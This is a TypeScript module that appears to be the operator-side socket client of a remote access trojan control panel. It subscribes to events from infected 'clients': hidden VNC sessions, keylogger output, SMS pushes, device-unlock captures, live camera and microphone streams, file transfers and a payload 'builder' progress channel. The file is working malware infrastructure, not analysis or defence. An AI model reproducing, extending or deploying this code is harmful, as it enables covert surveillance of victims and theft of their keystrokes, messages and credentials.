import { io, type Socket } from 'socket.io-client';

let adminSocket: Socket | null = null;

type DataChangeListener = (clientId: string, dataType: string, payload?: Record<string, unknown>) => void;
type TransferListener = (clientId: string, transfer: { transferId: string; name: string; totalChunks: number; totalSize: number; progress: number }) => void;
type BuilderProgressListener = (progress: BuilderProgress) => void;
type CommandStatusListener = (clientId: string, commandId: string, status: string, dataType?: string, error?: string, summary?: string) => void;
export type HvncMeta = { id: string; type: string; [key: string]: unknown };
export type HvncListener = (meta: HvncMeta, binary?: ArrayBuffer) => void;
type InspectorListener = (data: { id: string; type: string; [key: string]: unknown }) => void;
type KeyloggerListener = (data: { id: string; type: string; [key: string]: unknown }) => void;
type SmsPushListener = (data: { id: string; type: string; [key: string]: unknown }) => void;
type DeviceUnlockListener = (data: { id: string; type: string; [key: string]: unknown }) => void;
type CameraStreamListener = (meta: { id: string; cameraId: number; timestamp: number }, binary: ArrayBuffer) => void;
type MicStreamListener = (meta: { id: string; timestamp: number }, binary: ArrayBuffer) => void;

export interface BuilderProgress {
  step: string;
  message: string;
  complete: boolean;
  error: string | null;
  time: string;
  appName?: string;
}

const dataListeners: Set<DataChangeListener> = new Set();
const transferListeners: Set<TransferListener> = new Set();
const builderProgressListeners: Set<BuilderProgressListener> = new Set();
const commandStatusListeners: Set<CommandStatusListener> = new Set();
const hvncListeners: Set<HvncListener> = new Set();
const inspectorListeners: Set<InspectorListener> = new Set();
const keyloggerListeners: Set<KeyloggerListener> = new Set();
const smsPushListeners: Set<SmsPushListener> = new Set();
const deviceUnlockListeners: Set<DeviceUnlockListener> = new Set();
const cameraStreamListeners: Set<CameraStreamListener> = new Set();
const micStreamListeners: Set<MicStreamListener> = new Set();

const getToken = (): string => {
  try {
    return localStorage.getItem('auth-token') || '';
  } catch { return ''; }
};

export function initAdminSocket(onDeviceChange?: () => void): Socket {
  if (adminSocket) {
    adminSocket.removeAllListeners();
    adminSocket.disconnect();
  }

  const token = getToken();

  const s = io({
    transports: ['polling', 'websocket'],
    autoConnect: true,
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    query: { admin: 'true' },
    auth: { token },
  });

  s.io.on('reconnect_attempt', () => {
    s.auth = { token: getToken() };
  });
  s.on('client:connect', () => onDeviceChange?.());
  s.on('client:disconnect', () => onDeviceChange?.());
  s.on('client:data', (payload: { id: string; dataType: string; [key: string]: unknown }) => {
    onDeviceChange?.();
    const { id, dataType, ...extra } = payload;
    dataListeners.forEach((fn) => fn(id, dataType, Object.keys(extra).length > 0 ? extra : undefined));
  });
  s.on('client:update', (payload: { id: string; dataType: string; [key: string]: unknown }) => {
    onDeviceChange?.();
    const { id, dataType, ...extra } = payload;
    dataListeners.forEach((fn) => fn(id, dataType, Object.keys(extra).length > 0 ? extra : undefined));
  });
  s.on('client:transfer', (payload: { id: string; transferId: string; name: string; totalChunks: number; totalSize: number; progress: number }) => {
    transferListeners.forEach((fn) => fn(payload.id, payload));
  });
  s.on('builder:progress', (payload: BuilderProgress) => {
    builderProgressListeners.forEach((fn) => fn(payload));
  });
  s.on('client:command', (payload: { id: string; commandId: string; status: string; dataType?: string; error?: string; summary?: string }) => {
    commandStatusListeners.forEach((fn) => fn(payload.id, payload.commandId, payload.status, payload.dataType, payload.error, payload.summary));
  });
  s.on('client:hvnc', (meta: HvncMeta, binary?: ArrayBuffer) => {
    hvncListeners.forEach((fn) => fn(meta, binary));
  });
  s.on('client:inspector', (payload: { id: string; type: string; [key: string]: unknown }) => {
    inspectorListeners.forEach((fn) => fn(payload));
  });
  s.on('client:keylogger', (payload: { id: string; type: string; [key: string]: unknown }) => {
    keyloggerListeners.forEach((fn) => fn(payload));
  });
  s.on('client:sms_push', (payload: { id: string; type: string; [key: string]: unknown }) => {
    smsPushListeners.forEach((fn) => fn(payload));
  });
  s.on('client:device_unlock', (payload: { id: string; type: string; [key: string]: unknown }) => {
    deviceUnlockListeners.forEach((fn) => fn(payload));
  });
  s.on('client:camera_stream', (meta: any, binary: ArrayBuffer) => {
    cameraStreamListeners.forEach((fn) => fn(meta, binary));
  });
  s.on('client:mic_stream', (meta: any, binary: ArrayBuffer) => {
    micStreamListeners.forEach((fn) => fn(meta, binary));
  });

  adminSocket = s;
  return s;
}

export function disconnectAdminSocket(): void {
  if (adminSocket) {
    adminSocket.removeAllListeners();
    adminSocket.disconnect();
    adminSocket = null;
  }
  dataListeners.clear();
  transferListeners.clear();
  builderProgressListeners.clear();
  commandStatusListeners.clear();
  hvncListeners.clear();
  inspectorListeners.clear();
  keyloggerListeners.clear();
  smsPushListeners.clear();
  deviceUnlockListeners.clear();
  cameraStreamListeners.clear();
  micStreamListeners.clear();
}

export function onDataUpdate(listener: DataChangeListener): () => void {
  dataListeners.add(listener);
  return () => { dataListeners.delete(listener); };
}

export function onTransferUpdate(listener: TransferListener): () => void {
  transferListeners.add(listener);
  return () => { transferListeners.delete(listener); };
}

export function onBuilderProgress(listener: BuilderProgressListener): () => void {
  builderProgressListeners.add(listener);
  return () => { builderProgressListeners.delete(listener); };
}

export function onCommandStatus(listener: CommandStatusListener): () => void {
  commandStatusListeners.add(listener);
  return () => { commandStatusListeners.delete(listener); };
}

export function onHvncUpdate(listener: HvncListener): () => void {
  hvncListeners.add(listener);
  return () => { hvncListeners.delete(listener); };
}

export function onInspectorUpdate(listener: InspectorListener): () => void {
  inspectorListeners.add(listener);
  return () => { inspectorListeners.delete(listener); };
}

export function onKeyloggerUpdate(listener: KeyloggerListener): () => void {
  keyloggerListeners.add(listener);
  return () => { keyloggerListeners.delete(listener); };
}

export function onSmsPushUpdate(listener: SmsPushListener): () => void {
  smsPushListeners.add(listener);
  return () => { smsPushListeners.delete(listener); };
}

export function onDeviceUnlockUpdate(listener: DeviceUnlockListener): () => void {
  deviceUnlockListeners.add(listener);
  return () => { deviceUnlockListeners.delete(listener); };
}

export function onCameraStream(listener: CameraStreamListener): () => void {
  cameraStreamListeners.add(listener);
  return () => { cameraStreamListeners.delete(listener); };
}

export function onMicStream(listener: MicStreamListener): () => void {
  micStreamListeners.add(listener);
  return () => { micStreamListeners.delete(listener); };
}

export function getAdminSocket(): Socket | null {
  return adminSocket;
}
